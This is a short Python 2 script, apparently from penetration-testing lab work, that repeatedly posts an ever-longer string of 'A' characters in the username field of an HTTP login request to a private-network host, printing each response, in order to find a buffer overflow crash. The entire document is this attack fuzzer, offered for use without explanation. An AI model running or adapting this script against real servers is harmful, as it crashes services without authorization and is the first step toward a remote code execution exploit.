#!/usr/bin/python
import socket
import time

def recv_timeout(the_socket,timeout=2):
    #make socket non blocking
    the_socket.setblocking(0)
    
    #total data partwise in an array
    total_data=[];
    data='';
    
    #beginning time
    begin=time.time()
    while 1:
        #if you got some data, then break after timeout
        if total_data and time.time()-begin > timeout:
            break
        
        #if you got no data at all, wait a little longer, twice the timeout
        elif time.time()-begin > timeout*2:
            break
        
        #recv something
        try:
            data = the_socket.recv(8192)
            if data:
                total_data.append(data)
                #change the beginning time for measurement
                begin=time.time()
            else:
                #sleep for sometime to indicate a gap
                time.sleep(0.1)
        except:
            pass
    
    #join all parts to make final string
    return ''.join(total_data)




try:
    size = 0
    while True:
        print "\nSending evil buffer..."
        size = size +  100
        inputBuffer = "A" * size
        print("\n Buffer size : ", size)
        content = "username=" + inputBuffer + "&password=A"
        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 10.11.0.22\r\n"
        buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101Firefox/52.0\r\n"
        buffer += "Accept:text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://10.11.0.22/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        
        buffer += content
        print(content)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.207.10", 80))
        s.sendall(buffer)
        print(recv_timeout(s,2))
        s.close()

        print "\nDone!"
        time.sleep(2)
except Exception as e: 
    print(e)
    print "Could not connect!"
